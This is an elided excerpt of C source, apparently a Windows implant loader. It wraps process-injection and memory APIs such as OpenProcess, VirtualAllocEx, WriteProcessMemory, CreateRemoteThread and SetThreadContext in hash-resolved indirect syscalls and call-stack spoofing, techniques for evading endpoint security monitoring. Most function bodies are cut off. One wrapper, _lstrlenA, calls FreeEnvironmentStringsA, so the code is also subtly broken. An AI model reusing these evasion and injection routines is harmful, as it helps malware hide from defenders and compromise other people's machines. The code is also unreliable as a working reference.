...
DECLSPEC_IMPORT VOID WINAPI KERNEL32$OutputDebugStringA( LPCSTR );
...
static inline FUNCTION_CALL create_syscall ( DWORD moduleHash,  DWORD functionHash )
{
    SYSCALL syscall = { 0 };
    ...
    if ( resolve_syscall ( &syscall, moduledll, fn ) ) {
        call.ptr = syscall.gate; // address of syscall instruction
        call.ssn = syscall.ssn;  // the syscall ssn
    }
...
{
    // logDebug("loader - _InternetOpenA - START");
...
{
    // logDebug("loader - _InternetConnectA - START");
...
{
    // logDebug("loader - _CloseHandle - START");
    FUNCTION_CALL call = create_syscall ( NTDLL_HASH, NTCLOSE_HASH );
...
{
    // logDebug("loader - _CreateFileMappingA - START");
    SYSCALL syscall = { 0 };
...
{
    // logDebug("loader - _CreateProcessA - START");
...
{
    // logDebug("loader - _CreateRemoteThread - START");
...
{
    // logDebug("loader - _CreateThread - START");
    // NOTE: Attempted to convert to NtCreateThreadEx syscall but it didn't work properly.
    // The syscall implementation had issues with parameter ordering and flag conversion.
    // Reverting to Win API call with stack spoofing.
    FUNCTION_CALL call = { 0 };
...
{
    // logDebug("loader - _CoCreateInstance - START");
...
{
    // logDebug("loader - _DuplicateHandle - START");
...
{
    // logDebug("loader - _LoadLibraryA - START");
...
{
    // logDebug("loader - _GetThreadContext - START");
    FUNCTION_CALL call = { 0 };
...
{
    // logDebug("loader - _MapViewOfFile - START");
    SYSCALL syscall = { 0 };
...
{
    // logDebug("loader - _OpenProcess - START");
    SYSCALL syscall = { 0 };
...
{
    // logDebug("loader - _OpenThread - START");
    FUNCTION_CALL call = { 0 };
...
{
    // logDebug("loader - _ReadProcessMemory - START");
    SYSCALL syscall = { 0 };
...
{
    // logDebug("loader - _ResumeThread - START");
    FUNCTION_CALL call = { 0 };
...
{
    // logDebug("loader - _SetThreadContext - START");
    FUNCTION_CALL call = create_syscall ( NTDLL_HASH, NTSETCONTEXTTHREAD_HASH );
    if (call.ptr == NULL || call.ptr == 0 ||call.ssn == 0) {
        // Fallback to KERNEL32$SetThreadContext if syscall resolution fails for NtSetContextThread
...
{
    // logDebug("loader - _VirtualAllocEx - START");
    FUNCTION_CALL call = { 0 };
    ...
    /*
    FUNCTION_CALL call = create_syscall ( NTDLL_HASH, NTALLOCATEVIRTUALMEMORY_HASH );
    if (call.ptr == NULL || call.ptr == 0 ||call.ssn == 0) {
        call.ptr  = ( PVOID ) ( KERNEL32$VirtualAllocEx );
    }
    ...
    call.args [ 0 ] = spoof_arg ( hProcess );
    call.args [ 1 ] = spoof_arg ( &lpAddress );
    call.args [ 2 ] = spoof_arg ( 0 );
    call.args [ 3 ] = spoof_arg ( &dwSize );
    call.args [ 4 ] = spoof_arg ( flAllocationType );
    call.args [ 5 ] = spoof_arg ( flProtect );
...
{
    // logDebug("loader - _VirtualAlloc - START");
    FUNCTION_CALL call = { 0 };
...
{
    // logDebug("loader - _VirtualFree - START");
    SYSCALL syscall = { 0 };
...
{
    // logDebug("loader - _VirtualProtect - START");
    /*
...
{
    // logDebug("loader - _VirtualProtectEx - START");
    SYSCALL syscall = { 0 };
    if ( ! prepare_nt_syscall ( NTDLL_HASH, NTPROTECTVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
...
{
    // logDebug("loader - _VirtualQuery - START");
    SYSCALL syscall = { 0 };
...
{
    // logDebug("loader - _WriteProcessMemory - START");
    FUNCTION_CALL call = { 0 };
...
{
    // logDebug("loader - _ExitThread - START");
    FUNCTION_CALL call = { 0 };
...
LPCH WINAPI _GetEnvironmentStrings ()
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$GetEnvironmentStrings );
    call.argc = 0;

    return (LPCH) spoof_call ( &call );
}

int WINAPI _lstrlenA ( LPCSTR lpString )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$FreeEnvironmentStringsA );
    call.argc = 1;
    call.args [ 0 ]  = spoof_arg ( lpString );
